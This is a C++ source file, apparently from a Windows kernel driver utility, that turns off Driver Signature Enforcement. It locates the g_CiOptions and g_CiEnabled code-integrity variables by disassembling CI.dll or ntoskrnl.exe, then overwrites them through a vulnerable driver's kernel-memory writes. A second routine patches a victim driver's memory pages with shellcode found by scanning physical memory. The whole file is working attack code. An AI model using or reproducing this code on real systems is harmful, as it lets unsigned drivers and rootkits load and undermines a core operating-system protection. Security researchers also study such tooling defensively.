/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2022
*
*  TITLE:       DSEFIX.CPP
*
*  VERSION:     1.28
*
*  DATE:        01 Dec 2022
*
*  CI DSE corruption related routines.
*  Based on DSEFix v1.3
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

#ifdef __cplusplus
extern "C" {
    void BaseShellDSEFix();
    void BaseShellDSEFixEnd();
}
#endif

ULONG KDUpCheckInstructionBlock(
    _In_ PBYTE Code,
    _In_ ULONG Offset
)
{
    ULONG offset = Offset;
    hde64s hs;

    RtlSecureZeroMemory(&hs, sizeof(hs));

    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;

    if (hs.len != 3)
        return 0;

    //
    // mov     r9, rbx
    //
    if (Code[offset] != 0x4C ||
        Code[offset + 1] != 0x8B)
    {
        return 0;
    }

    offset += hs.len;

    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;

    if (hs.len != 3)
        return 0;

    //
    // mov     r8, rdi
    //
    if (Code[offset] != 0x4C ||
        Code[offset + 1] != 0x8B)
    {
        return 0;
    }

    offset += hs.len;

    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;
    if (hs.len != 3)
        return 0;

    //
    // mov     rdx, rsi
    //
    if (Code[offset] != 0x48 ||
        Code[offset + 1] != 0x8B)
    {
        return 0;
    }

    offset += hs.len;

    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;

    if (hs.len != 2)
        return 0;

    //
    // mov     ecx, ebp
    //
    if (Code[offset] != 0x8B ||
        Code[offset + 1] != 0xCD)
    {
        return 0;
    }

    return offset + hs.len;
}

/*
* KDUQueryCiEnabled
*
* Purpose:
*
* Find g_CiEnabled variable address for Windows 7.
*
*/
NTSTATUS KDUQueryCiEnabled(
    _In_ HMODULE ImageMappedBase,
    _In_ ULONG_PTR ImageLoadedBase,
    _Out_ ULONG_PTR* ResolvedAddress,
    _In_ SIZE_T SizeOfImage
)
{
    NTSTATUS    ntStatus = STATUS_UNSUCCESSFUL;
    SIZE_T      c;
    LONG        rel = 0;

    *ResolvedAddress = 0;

    for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
        if (*(PDWORD)((PBYTE)ImageMappedBase + c) == 0x1d8806eb) {
            rel = *(PLONG)((PBYTE)ImageMappedBase + c + 4);
            *ResolvedAddress = ImageLoadedBase + c + 8 + rel;
            ntStatus = STATUS_SUCCESS;
            break;
        }
    }

    return ntStatus;
}

/*
* KDUQueryCiOptions
*
* Purpose:
*
* Find g_CiOptions variable address.
* Depending on current Windows version it will look for target value differently.
*
* Params:
*
*   ImageMappedBase - CI.dll user mode mapped base
*   ImageLoadedBase - CI.dll kernel mode loaded base
*   ResolvedAddress - output variable to hold result value
*   NtBuildNumber   - current NT build number for search pattern switch
*
*/
NTSTATUS KDUQueryCiOptions(
    _In_ HMODULE ImageMappedBase,
    _In_ ULONG_PTR ImageLoadedBase,
    _Out_ ULONG_PTR* ResolvedAddress,
    _In_ ULONG NtBuildNumber
)
{
    PBYTE       ptrCode = NULL;
    ULONG       offset, k, expectedLength;
    LONG        relativeValue = 0;
    ULONG_PTR   resolvedAddress = 0;

    hde64s hs;

    *ResolvedAddress = 0ULL;

    ptrCode = (PBYTE)GetProcAddress(ImageMappedBase, (PCHAR)"CiInitialize");
    if (ptrCode == NULL)
        return STATUS_PROCEDURE_NOT_FOUND;

    RtlSecureZeroMemory(&hs, sizeof(hs));
    offset = 0;

    //
    // For Win7, Win8/8.1, Win10 until RS3
    //
    if (NtBuildNumber < NT_WIN10_REDSTONE3) {

        expectedLength = 5;

        do {

            hde64_disasm(&ptrCode[offset], &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == expectedLength) { //test if jmp

                //
                // jmp CipInitialize
                //
                if (ptrCode[offset] == 0xE9) {
                    relativeValue = *(PLONG)(ptrCode + offset + 1);
                    break;
                }

            }

            offset += hs.len;

        } while (offset < 256);
    }
    else {
        //
        // Everything above Win10 RS3.
        //
        expectedLength = 3;

        do {

            hde64_disasm(&ptrCode[offset], &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == expectedLength) {

                //
                // Parameters for the CipInitialize.
                //
                k = KDUpCheckInstructionBlock(ptrCode,
                    offset);

                if (k != 0) {

                    expectedLength = 5;
                    hde64_disasm(&ptrCode[k], &hs);
                    if (hs.flags & F_ERROR)
                        break;

                    //
                    // call CipInitialize
                    //
                    if (hs.len == expectedLength) {
                        if (ptrCode[k] == 0xE8) {
                            offset = k;
                            relativeValue = *(PLONG)(ptrCode + k + 1);
                            break;
                        }
                    }

                }

            }

            offset += hs.len;

        } while (offset < 256);

    }

    if (relativeValue == 0)
        return STATUS_UNSUCCESSFUL;

    ptrCode = ptrCode + offset + hs.len + relativeValue;
    relativeValue = 0;
    offset = 0;
    expectedLength = 6;

    do {

        hde64_disasm(&ptrCode[offset], &hs);
        if (hs.flags & F_ERROR)
            break;

        if (hs.len == expectedLength) { //test if mov

            if (*(PUSHORT)(ptrCode + offset) == 0x0d89) {
                relativeValue = *(PLONG)(ptrCode + offset + 2);
                break;
            }

        }

        offset += hs.len;

    } while (offset < 256);

    if (relativeValue == 0)
        return STATUS_UNSUCCESSFUL;

    ptrCode = ptrCode + offset + hs.len + relativeValue;
    resolvedAddress = ImageLoadedBase + ptrCode - (PBYTE)ImageMappedBase;

    *ResolvedAddress = resolvedAddress;

    return STATUS_SUCCESS;
}

/*
* KDUQueryCodeIntegrityVariableAddress
*
* Purpose:
*
* Find CI variable address.
* Depending on NT version search in ntoskrnl.exe or ci.dll
*
*/
ULONG_PTR KDUQueryCodeIntegrityVariableAddress(
    _In_ ULONG NtBuildNumber
)
{
    NTSTATUS ntStatus;
    ULONG loadedImageSize = 0;
    SIZE_T sizeOfImage = 0;
    ULONG_PTR Result = 0, imageLoadedBase, kernelAddress = 0;
    LPWSTR lpModuleName;
    HMODULE mappedImageBase;

    WCHAR szFullModuleName[MAX_PATH * 2];

    if (NtBuildNumber < NT_WIN8_RTM) {
        lpModuleName = (LPWSTR)NTOSKRNL_EXE;
    }
    else {
        lpModuleName = (LPWSTR)CI_DLL;
    }

    imageLoadedBase = supGetModuleBaseByName(lpModuleName, &loadedImageSize);
    if (imageLoadedBase == 0) {

        supPrintfEvent(kduEventError,
            "[!] Abort, could not query \"%ws\" image base\r\n", lpModuleName);

        return 0;
    }

    szFullModuleName[0] = 0;
    if (!GetSystemDirectory(szFullModuleName, MAX_PATH))
        return 0;

    _strcat(szFullModuleName, TEXT("\\"));
    _strcat(szFullModuleName, lpModuleName);

    //
    // Preload module for pattern search.
    //
    mappedImageBase = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (mappedImageBase) {

        printf_s("[+] Module \"%ws\" loaded for pattern search\r\n", lpModuleName);

        if (NtBuildNumber < NT_WIN8_RTM) {

            ntStatus = supQueryImageSize(mappedImageBase,
                &sizeOfImage);

            if (NT_SUCCESS(ntStatus)) {

                ntStatus = KDUQueryCiEnabled(mappedImageBase,
                    imageLoadedBase,
                    &kernelAddress,
                    sizeOfImage);

            }

        }
        else {

            ntStatus = KDUQueryCiOptions(mappedImageBase,
                imageLoadedBase,
                &kernelAddress,
                NtBuildNumber);

        }

        if (NT_SUCCESS(ntStatus)) {

            if (IN_REGION(kernelAddress,
                imageLoadedBase,
                loadedImageSize))
            {
                Result = kernelAddress;
            }
            else {

                supPrintfEvent(kduEventError,
                    "[!] Resolved address 0x%llX does not belong required module.\r\n",
                    kernelAddress);

            }

        }
        else {

            supPrintfEvent(kduEventError,
                "[!] Failed to locate kernel variable address, NTSTATUS (0x%lX)\r\n",
                ntStatus);

        }

        FreeLibrary(mappedImageBase);

    }
    else {

        //
        // Output error.
        //
        supPrintfEvent(kduEventError,
            "[!] Could not load \"%ws\", GetLastError %lu\r\n",
            lpModuleName,
            GetLastError());

    }

    return Result;
}

/*
* KDUControlDSE2
*
* Purpose:
*
* Change Windows CodeIntegrity flags using memory brute-force.
*
*/
BOOL KDUControlDSE2(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;
    BYTE shellBuffer[SHELLCODE_SMALL];
    SIZE_T shellSize = (ULONG_PTR)BaseShellDSEFixEnd - (ULONG_PTR)BaseShellDSEFix;

    KDU_PROVIDER* prov;
    KDU_VICTIM_PROVIDER* victimProv;
    HANDLE victimDeviceHandle = NULL;

    KDU_PHYSMEM_ENUM_PARAMS enumParams;

    prov = Context->Provider;
    victimProv = Context->Victim;

    RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
    RtlCopyMemory(shellBuffer, BaseShellDSEFix, shellSize);

    *(PULONG_PTR)&shellBuffer[0x2] = Address;
    *(PULONG_PTR)&shellBuffer[0xC] = DSEValue;


    if (shellSize > SHELLCODE_SMALL) {
        supPrintfEvent(kduEventError,
            "[!] Patch code size 0x%llX exceeds limit 0x%lX, abort\r\n", shellSize, SHELLCODE_SMALL);

        return FALSE;
    }

    //
    // Load/open victim.
    //
    if (VpCreate(victimProv,
        Context->ModuleBase,
        &victimDeviceHandle))
    {
        printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);
    }
    else {

        supPrintfEvent(kduEventError,
            "[!] Error preloading victim driver, abort\r\n");

        return FALSE;
    }

    printf_s("[+] DSE flags (0x%p) new value to be written: %lX\r\n",
        (PVOID)Address,
        DSEValue);

    enumParams.bWrite = TRUE;
    enumParams.cbPagesFound = 0;
    enumParams.cbPagesModified = 0;
    enumParams.Context = Context;
    enumParams.pvPayload = shellBuffer;
    enumParams.cbPayload = (ULONG)shellSize;

    supPrintfEvent(kduEventInformation,
        "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);

    if (supEnumeratePhysicalMemory(KDUProcExpPagePatchCallback, &enumParams)) {

        printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
            enumParams.cbPagesFound,
            enumParams.cbPagesModified);

        //
        // Run shellcode.
        //
        VpExecutePayload(victimProv, &victimDeviceHandle);

        supPrintfEvent(kduEventInformation,
            "[+] DSE patch executed successfully\r\n");
    }

    //
    // Ensure victim handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    //
    // Cleanup.
    //
    if (VpRelease(victimProv, &victimDeviceHandle)) {
        printf_s("[+] Victim released\r\n");
    }

    return bResult;
}

/*
* KDUControlDSE
*
* Purpose:
*
* Change Windows CodeIntegrity flags state.
*
*/
BOOL KDUControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;
    ULONG ulFlags = 0;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    //
    // Read current flags state.
    //
    bResult = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
        Address,
        &ulFlags,
        sizeof(ulFlags));

    if (!bResult) {
        supPrintfEvent(kduEventError,
            "[!] Could not query DSE state, GetLastError %lu\r\n",
            GetLastError());

    }
    else {

        printf_s("[+] DSE flags (0x%p) value: %lX, new value to be written: %lX\r\n",
            (PVOID)Address,
            ulFlags,
            DSEValue);

        if (DSEValue == ulFlags) {
            printf_s("[~] Warning, current value is identical to what you want to write\r\n");
        }

        DWORD dwLastError;

        bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
            Address,
            &DSEValue,
            sizeof(DSEValue));

        dwLastError = GetLastError();

        if (bResult) {

            printf_s("[+] Kernel memory write complete, verifying data\r\n");

            //
            // Verify write.
            //
            ulFlags = 0;
            bResult = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                Address,
                &ulFlags,
                sizeof(ulFlags));

            dwLastError = GetLastError();

            if (bResult) {

                bResult = (ulFlags == DSEValue);

                supPrintfEvent(
                    (bResult == FALSE) ? kduEventError : kduEventInformation,
                    "%s Write result verification %s\r\n",
                    (bResult == FALSE) ? "[!]" : "[+]",
                    (bResult == FALSE) ? "failed" : "succeeded");


            }
            else {
                supPrintfEvent(kduEventError,
                    "[!] Could not verify kernel memory write, GetLastError %lu\r\n",
                    dwLastError);

            }
        }
        else {
            supPrintfEvent(kduEventError,
                "[!] Error while writing to the kernel memory, GetLastError %lu\r\n",
                dwLastError);
        }

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bResult;
}
